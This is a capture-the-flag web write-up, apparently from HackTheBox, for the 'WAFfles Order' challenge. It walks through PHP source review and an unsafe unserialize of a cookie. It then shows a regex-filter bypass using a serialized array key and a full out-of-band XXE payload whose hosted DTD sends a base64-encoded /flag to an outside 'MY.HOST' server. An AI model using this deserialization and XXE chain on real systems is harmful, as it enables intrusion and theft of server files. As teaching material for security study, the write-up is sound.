+++
title = "WAFfles Order"
category = "web"

+++

> Our WAFfles and ice scream are out of this world, come to our online WAFfles house and check out our super secure ordering system API!

## Enumeration

Browsing to the website, we are greeted with this aesthetically... interesting... page:

![image-20201122190754660](../image-20201122190754660.png)

We can input a table number, and send it off:

![image-20201122191407926](../image-20201122191407926.png)

For which the post request looks like:

![image-20201122191450370](../image-20201122191450370.png)

## Source Code Review

Nothing really interesting here. However! We are given the source code for the application, which means we're in for some fun. Fortunately, the code is very concise and easy to read. Poking around, we read `controllers/OrderController.php`, which handles our order requests. 

```php {hl_lines=["8-9"]}
<?php
class OrderController
{
    public function order($router)
    {
        $body = file_get_contents('php://input');
        $cookie = base64_decode($_COOKIE['PHPSESSID']);
        safe_object($cookie);
        $user = unserialize($cookie);

        if ($_SERVER['HTTP_CONTENT_TYPE'] === 'application/json')
        {
            $order = json_decode($body);
            if (!$order->food) 
                return json_encode([
                    'status' => 'danger',
                    'message' => 'You need to select a food option first'
                ]);
            if ($_ENV['debug'])
            {
                $date = date('d-m-Y G:i:s');
                file_put_contents('/tmp/orders.log', "[${date}] ${body} by {$user->username}\n", FILE_APPEND);
            }
            return json_encode([
                'status' => 'success',
                'message' => "Hello {$user->username}, your {$order->food} order has been submitted successfully."
            ]);
        }
        else
        {
            return $router->abort(400);
        }
    }
}
?>
```

This is pretty juicy! Namely, on line 24 we see that our !!! **user controlled** !!! cookie is unserialized. That means, depending on what classes are included in the application, we might be able to get local file inclusion (LFI) or even remote code execution (RCE).

---

A brief aside on PHP unserialization, from a PHP noob:

Sometimes, PHP writers want to store PHP objects or data in a string format for easy storage or retrieval.
It's a **standard format**. For example, for our UserModel object, the serialized data might look like `O:9:"UserModel":1:{s:8:"username";s:10:"guest_5fb8";}` where `O` means object, the numbers are length specifiers, and `s` means string for both key and value, separated by semicolons.

So, if we can control the string that is unserialized, we can "create" any object we want! But we can't execute any actual PHP code, so how is that useful?
Except in very rare cases, we're going to have to rely on PHP "**magic functions**", some of which get run automatically on object creation/serialization (`__construct/__sleep`) or destruction/unserialization (`__destruct/__wakeup`) or other situations like being printed (`__toString`). So, our goal is to create an object that has some magic functions we can use.
> Note that all of these functions start with `__`. This becomes important later.

---

The only two models/classes included in the application are `UserModel`, used for handling of user data in receiving orders, and `XMLParserModel`, which is used for some throwaway environment file parsing, and looks like:

```php {hl_lines=14}
<?php
class XmlParserModel
{
    private string $data;
    private array $env;

    public function __construct($data)
    {
        $this->data = $data;
    }

    public function __wakeup()
    {
        if (preg_match_all("/<!ENTITY\s+[^\s]+\s+SYSTEM\s+[\'\"](?i:file|http|https|ftp|php|zlib|data|glob|expect|zip):\/\//mi", $this->data))
        {
            die('Unsafe XML');
        }
        $env = simplexml_load_string($this->data, 'SimpleXMLElement', LIBXML_NOENT);
        foreach ($env as $key => $value)
        {
            $_ENV[$key] = (string)$value;
        }
    }

}
?>
```

We see that this class has both `__construct` and `__wakeup`, and is pretty much exactly what we need. Also note that `simplexml_load_string` is called with the `LIBXML_NOENT` flag, for which the docs say:

![image-20201122193157028](../image-20201122193157028.png)

And, we see the very suspicious `preg_match_all` call with strings commonly found in XML External Entities (XXE) payloads. Sounds like a plan! :flushed:

> Web challenge tip: if you're given source code, and it's a tough challenge, ALWAYS set up a local copy! I don't think I would've been able to solve this if I hadn't been able to add debug messages.

So now, we should be thinking: how can we get an `XmlParserObject` with our arbitrary data unserialized? The astute among us may have seen the call to `safe_object` function right before the cookie is deserialized, which is fortunately not a standard PHP function. Here's what it does:

{{< highlight php >}}
<?php
function safe_object($serialized_data)
{
    $matches = [];
    $num_matches = preg_match_all('/(^|;)O:\d+:"([^"]+)"/', $serialized_data, $matches);

    for ($i = 0; $i < $num_matches; $i++) {
        $methods = get_class_methods($matches[2][$i]);
        foreach ($methods as $method) {
            if (preg_match('/^__.*$/', $method) != 0) {
                die("Unsafe method: ${method}");
            }
        }
    }
}
{{< / highlight >}}

Or, essentially, if any matches to the regex `(^|;)O:\d+:"([^"]+)"` are found, check the methods for the class within the quotes, and if it has any methods starting with `__`, refuse to continue.

The regex broken down goes like this: `start of line` or `;`, then `O:numbers:"sometext"`.

So it would match `O:14:"XmlParserModel":...` and `a:1:{i:0;O:14:"XmlParserModel":...`, both correctly grabbing the name of the object. So we need to somehow bypass the regex, or cause it to grab the wrong name for the object.

## Regex Bypass

This took me SO long to figure out. The key insight I was missing is that with `pgrep_match_all`, if some text is part of one match, it won't search that text for the start of another match. For example, for this input:

```txt
APPLEAPPLESAUCE ORANGESAUCE
```

with the regex searching for `APPLE` followed by any `A-Z` characters then some whitespace `\s`, it will only match `APPLEAPPLESAUCE` and NOT `APPLESAUCE` (as a substring of `APPLEAPPLESAUCE`). 

Therefore, we could put the object initialization into a serialized array, for which the key is the start of an (invalid) object serialization string. So, something like:

```php
<?php

require("./models/XmlParserModel.php");
require("./models/UserModel.php");

$payload = 'XXE-causing XML here';

$foo = new XmlParserModel($payload);

$lol = new UserModel();
$lol->username = 'admin';
$lol->test = array(
    ";O:12:" => $foo,
);

echo serialize($lol);

?>
```

Which produces:

```php
O:9:"UserModel":2:{s:8:"username";s:5:"admin";s:4:"test";a:1:{s:6:";O:12:";O:14:"XmlParserModel":1:{s:20:"^@XmlParserModel^@data";s:20:"XXE-causing XML here";}}}
```

Due to the key name being `O:12:`, the regex will include the start of the _actual_ object deserialization as `O:12:";O:14:"`. Obviously, `;O:14:` is not a valid class name, so we finally bypass the method check, and move on to trying to trigger XXE for file exfiltration.

## XXE

However, no joy, there's another regex filter! This is the same one we saw earlier that suggested XXE.

```php
preg_match_all("/<!ENTITY\s+[^\s]+\s+SYSTEM\s+[\'\"](?i:file|http|https|ftp|php|zlib|data|glob|expect|zip):\/\//mi")
```

So, case insensitive looking for any `<!ENTITY SYSTEM ...` calls. This regex is a lot less effective than the other one and I got past it a couple times without even meaning to. 

If you haven't seen XXE used before, our goal is to take a reference to an external object (like, a file) with an XML `ENTITY` followed by `SYSTEM` or `PUBLIC "name"`,  and include its content in an HTTP request in order to exfiltrate it.

Let's test it on local to make sure that XXE works with a basic payload:

![image-20201122195427539](../image-20201122195427539.png)

Cool, it grabs files locally. Now we have to get it to reach out with the content of those files, and `/flag` instead of `/etc/passwd`.

 In the end, I went for Out of Band (OOB) XXE, hosting the following `DTD` on my server:

```sh
<!ENTITY % cool SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % all '<!ENTITY send SYSTEM "http://MY.HOST:4200/%cool;">'>
%all;
```

We knew the flag was at `/flag` with the source we downloaded. It's `base64` encoded because the newline `\n` at the end of the file would cause `SimpleXML` to throw and error and say that the Uniform Resource Indicator (URI) was invalid when we tried to include the file contents as part of it.

So, our final object solve "script" looks like:

```php
<?php

require("./models/XmlParserModel.php");
require("./models/UserModel.php");

$payload = '<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM
"file:///flag">
<!ENTITY % dtd SYSTEM
"http://MY.HOST/ctf.dtd">
%dtd;
]>
<data>&send;</data>';

$foo = new XmlParserModel($payload);

$lol = new UserModel();
$lol->username = 'admin';
$lol->test = array(
    ";O:12:" => $foo,
);

echo serialize($lol);

?>
```

Before getting the flag though, I'd like to mention that, like most writeups, this post gives an illusion of intelligence and purpose, which is most definitely false. Due to source being pretty small, we were able to ascertain the correct path pretty quickly, but we also tried:

- Tomfoolery with JSON posted to endpoint for an order
  - Had both client and server side validation
  - No server-side template injection
- PHPSESSID generation was predictable, maybe forge it?
- Eight billion types of regex bypasses that didn't work
  - Explored source code and niche blog posts to find `+` before number in a serialized object bypass or `C` custom datatype

Back to the fun, we submit our malicious cookie, and get a callback from remote!

![image-20201122195624427](../image-20201122195624427.png)

And the flag, for the first blood and a massive dopamine hit:

![image-20201122195700319](../image-20201122195700319.png)

Thank you to makelaris and makelarisjr for a great challenge :)

Flag: `HTB{wh0_l3t_th3_enc0d1ngs_0ut??w00f..w00f..w00f..WAFfles!}`

